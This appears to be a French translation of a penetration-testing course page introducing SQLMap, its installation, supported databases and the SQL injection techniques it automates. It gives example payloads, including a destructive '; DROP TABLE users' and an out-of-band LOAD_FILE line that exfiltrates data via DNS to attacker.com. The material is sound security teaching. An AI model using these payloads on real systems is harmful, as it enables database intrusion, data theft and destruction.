Présentation de SQLMap
======================

* * * * *

[SQLMap](https://github.com/sqlmapproject/sqlmap) est un outil de test d'intrusion gratuit et open source écrit en Python qui automatise le processus de détection et d'exploitation des failles d'injection SQL (SQLi). SQLMap a été continuellement développé depuis 2006 et est toujours maintenu aujourd'hui.

```
dsgsec@htb[/htb]$ python sqlmap.py -u 'http://inlanefreight.htb/page.php?id=5'

       ___
       __H__
 ___ ___[']_____ ___ ___  {1.3.10.41#dev}
|_ -| . [']     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 12:55:56

[12:55:56] [INFO] testing connection to the target URL
[12:55:57] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
[12:55:58] [INFO] testing if the target URL content is stable
[12:55:58] [INFO] target URL content is stable
[12:55:58] [INFO] testing if GET parameter 'id' is dynamic
[12:55:58] [INFO] confirming that GET parameter 'id' is dynamic
[12:55:59] [INFO] GET parameter 'id' is dynamic
[12:55:59] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[12:56:00] [INFO] testing for SQL injection on GET parameter 'id'
<...SNIP...>

```

SQLMap est livré avec un moteur de détection puissant, de nombreuses fonctionnalités et une large gamme d'options et de commutateurs pour en affiner les nombreux aspects, tels que :

|  |  |  |
| --- | --- | --- |
| Connexion cible | Détection des injections | Prise d'empreintes digitales |
| Énumération | Optimisation | Détection et contournement de la protection à l'aide de scripts "tamper" |
| Récupération du contenu de la base de données | Accès au système de fichiers | Exécution des commandes du système d'exploitation (OS) |

* * * * *

Installation de SQLMap
----------------------

SQLMap est préinstallé sur votre Pwnbox et sur la majorité des systèmes d'exploitation axés sur la sécurité. SQLMap se trouve également sur de nombreuses bibliothèques de distributions Linux. Par exemple, sur Debian, il peut être installé avec :

```
dsgsec@htb[/htb]$ sudo apt install sqlmap

```

Si nous souhaitons installer manuellement, nous pouvons utiliser la commande suivante dans le terminal Linux ou la ligne de commande Windows :

```
dsgsec@htb[/htb]$ git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev

```

Après cela, SQLMap peut être exécuté avec :

```
dsgsec@htb[/htb]$ python sqlmap.py

```

* * * * *

Bases de données prises en charge
---------------------------------

SQLMap offre le plus grand support pour les SGBD parmi tous les autres outils d'exploitation SQL. SQLMap prend entièrement en charge les SGBD suivants :

|  |  |  |  |
| --- | --- | --- | --- |
| `MySQL` | `Oracle` | `PostgreSQL` | `Microsoft SQL Server` |
| `SQLite` | `IBM DB2` | `Microsoft Access` | `Firebird` |
| `Sybase` | `SAP MaxDB` | `Informix` | `MariaDB` |
| `HSQLDB` | `CockroachDB` | `TiDB` | `MemSQL` |
| `H2` | `MonetDB` | `Apache Derby` | `Amazon Redshift` |
| `Vertica`,`Mckoi` | `Presto` | `Altibase` | `MimerSQL` |
| `CrateDB` | `Greenplum` | `Drizzle` | `Apache Ignite` |
| `Cubrid` | `InterSystems Cache` | `IRIS` | `eXtremeDB` |
| `FrontBase` |  |  |  |

L'équipe SQLMap travaille également à l'ajout et à la prise en charge périodique de nouveaux SGBD.

* * * * *

Types d'injection SQL pris en charge
------------------------------------

SQLMap est le seul outil de test d'intrusion capable de détecter et d'exploiter correctement tous les types SQLi connus. On voit les types d'injections SQL supportées par SQLMap avec la `sqlmap -hh`commande :

```
dsgsec@htb[/htb]$ sqlmap -hh
...SNIP...
  Techniques:
    --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")

```

Les caractères techniques `BEUSTQ`font référence aux éléments suivants :

-   `B`: Store booléen
-   `E`: Basé sur les erreurs
-   `U` : basé sur une requête d'union
-   `S`: Requêtes empilées
-   `T`: Store basé sur le temps
-   `Q`: Requêtes en ligne

* * * * *

Injection SQL aveugle basée sur des booléens
--------------------------------------------

Exemple de `Boolean-based blind SQL Injection`:

Code : sql

```
AND 1=1

```

SQLMap exploite `Boolean-based blind SQL Injection`les vulnérabilités en différenciant les résultats `TRUE`des `FALSE`requêtes, récupérant efficacement 1 octet d'informations par requête. La différenciation est basée sur la comparaison des réponses du serveur pour déterminer si la requête SQL a renvoyé `TRUE`ou `FALSE`. Cela va des comparaisons floues du contenu brut des réponses, des codes HTTP, des titres de pages, du texte filtré et d'autres facteurs.

-   `TRUE`les résultats sont généralement basés sur des réponses n'ayant aucune différence ou une différence marginale par rapport à la réponse habituelle du serveur.

-   `FALSE`les résultats sont basés sur des réponses présentant des différences substantielles par rapport à la réponse habituelle du serveur.

-   `Boolean-based blind SQL Injection`est considéré comme le type SQLi le plus courant dans les applications Web.

* * * * *

Injection SQL basée sur les erreurs
-----------------------------------

Exemple de `Error-based SQL Injection`:

Code : sql

```
AND GTID_SUBSET(@@version,0)

```

Si les erreurs `database management system`( `DBMS`) sont renvoyées dans le cadre de la réponse du serveur pour des problèmes liés à la base de données, il est alors probable qu'elles puissent être utilisées pour transmettre les résultats des requêtes demandées. Dans de tels cas, des charges utiles spécialisées pour le SGBD actuel sont utilisées, ciblant les fonctions à l'origine de dysfonctionnements connus. SQLMap possède la liste la plus complète de ces charges utiles associées et couvre `Error-based SQL Injection`les SGBD suivants :

|  |  |  |
| --- | --- | --- |
| MySQL | PostgreSQL | Oracle |
| Microsoft SQL Server | Sybase | Vertique |
| IBM DB2 | Oiseau de feu | MonetDB |

SQLi basé sur les erreurs est considéré comme plus rapide que tous les autres types, à l'exception des requêtes UNION, car il peut récupérer une quantité limitée (par exemple, 200 octets) de données appelées « morceaux » à travers chaque requête.

* * * * *

Basé sur une requête UNION
--------------------------

Exemple de `UNION query-based SQL Injection`:

Code : sql

```
UNION ALL SELECT 1,@@version,3

```

Avec l'utilisation de `UNION`, il est généralement possible d'étendre la `vulnerable`requête originale ( ) avec les résultats des instructions injectées. De cette façon, si les résultats de la requête d'origine sont rendus dans le cadre de la réponse, l'attaquant peut obtenir des résultats supplémentaires à partir des instructions injectées dans la réponse de la page elle-même. Ce type d'injection SQL est considéré comme le plus rapide, car, dans le scénario idéal, l'attaquant serait capable d'extraire le contenu de l'intégralité de la table de la base de données qui l'intéresse avec une seule requête.

* * * * *

Requêtes empilées
-----------------

Exemple de `Stacked Queries`:

Code : sql

```
; DROP TABLE users

```

L'empilement de requêtes SQL, également connu sous le nom de « piggy-backing », est une forme d'injection d'instructions SQL supplémentaires après l'instruction vulnérable. Dans le cas où il est nécessaire d'exécuter des instructions sans requête (par exemple `INSERT`, `UPDATE`ou `DELETE`), l'empilement doit être pris en charge par la plate-forme vulnérable (par exemple, `Microsoft SQL Server`et `PostgreSQL`le prendre en charge par défaut). SQLMap peut utiliser de telles vulnérabilités pour exécuter des instructions sans requête exécutées dans des fonctionnalités avancées (par exemple, l'exécution de commandes du système d'exploitation) et pour la récupération de données de la même manière que les types SQLi aveugles basés sur le temps.

* * * * *

Injection SQL aveugle basée sur le temps
----------------------------------------

Exemple de `Time-based blind SQL Injection`:

Code : sql

```
AND 1=IF(2>1,SLEEP(5),0)

```

Le principe de `Time-based blind SQL Injection`est similaire à celui de `Boolean-based blind SQL Injection`, mais ici le temps de réponse est utilisé comme source de différenciation entre `TRUE`ou `FALSE`.

-   `TRUE`La réponse est généralement caractérisée par la différence notable dans le temps de réponse par rapport à la réponse habituelle du serveur.

-   `FALSE`la réponse doit donner lieu à un temps de réponse impossible à distinguer des temps de réponse réguliers

`Time-based blind SQL Injection`est considérablement plus lent que le SQLi aveugle basé sur booléen, car les requêtes qui en résulteraient `TRUE`retarderaient la réponse du serveur. Ce type SQLi est utilisé dans les cas où `Boolean-based blind SQL Injection`il n'est pas applicable. Par exemple, dans le cas où l'instruction SQL vulnérable n'est pas une requête (par exemple `INSERT`, `UPDATE`ou `DELETE`), exécutée dans le cadre de la fonctionnalité auxiliaire sans aucun effet sur le processus de rendu de page, SQLi basé sur le temps est utilisé par nécessité, comme cela ne serait pas le cas `Boolean-based blind SQL Injection`. fonctionne vraiment dans ce cas.

* * * * *

Requêtes en ligne
-----------------

Exemple de `Inline Queries`:

Code : sql

```
SELECT (SELECT @@version) from

```

Ce type d'injection intégrait une requête dans la requête d'origine. Une telle injection SQL est rare, car elle nécessite que l'application Web vulnérable soit écrite d'une certaine manière. Néanmoins, SQLMap prend également en charge ce type de SQLi.

* * * * *

Injection SQL hors bande
------------------------

Exemple de `Out-of-band SQL Injection`:

Code : sql

```
LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))

```

Ceci est considéré comme l'un des types de SQLi les plus avancés, utilisé dans les cas où tous les autres types ne sont pas pris en charge par l'application Web vulnérable ou sont trop lents (par exemple, SQLi aveugle basé sur le temps). SQLMap prend en charge SQLi hors bande via « l'exfiltration DNS », où les requêtes demandées sont récupérées via le trafic DNS.

En exécutant SQLMap sur le serveur DNS pour le domaine sous contrôle (par exemple `.attacker.com`), SQLMap peut effectuer l'attaque en forçant le serveur à demander des sous-domaines inexistants (par exemple `foo.attacker.com`), où `foo`se trouverait la réponse SQL que nous souhaitons recevoir. SQLMap peut ensuite collecter ces requêtes DNS erronées et en collecter la `foo`partie, pour former la réponse SQL entière.
